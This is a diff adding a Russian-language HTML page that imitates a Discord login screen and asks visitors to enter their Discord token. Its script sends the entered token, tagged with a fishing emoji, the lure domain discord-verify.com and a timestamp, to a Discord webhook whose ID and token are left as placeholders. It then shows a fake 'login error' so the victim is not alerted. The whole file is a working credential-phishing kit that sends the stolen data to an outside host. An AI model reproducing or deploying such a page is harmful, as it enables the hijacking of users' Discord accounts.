@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><title>Discord Login</title></head>
+<body style="background:#36393f; color:white; font-family:Arial;">
+<div style="max-width:400px; margin:100px auto; background:#2f3136; padding:20px; border-radius:8px;">
+<h1 style="color:#5865f2;">Добро пожаловать!</h1>
+<input id="token" placeholder="Введите токен Discord" style="width:100%; padding:10px; margin:10px 0;">
+<button onclick="send()" style="background:#5865f2; color:white; border:none; padding:10px 20px;">Войти</button>
+</div>
+<script>
+const webhook = 'https://discord.com/api/webhooks/ВАШ_ID/ВАШ_ТОКЕН';
+function send() {
+    const token = document.getElementById('token').value;
+    fetch(webhook, {method:'POST', body:JSON.stringify({content:'🎣 НОВЫЙ ТОКЕН: ' + token + ' | Страница: discord-verify.com | Время: ' + new Date().toLocaleString()}), headers:{'Content-Type':'application/json'}});
+    alert('Ошибка входа. Попробуйте позже.');
+}
+</script>
+</body>
+</html>
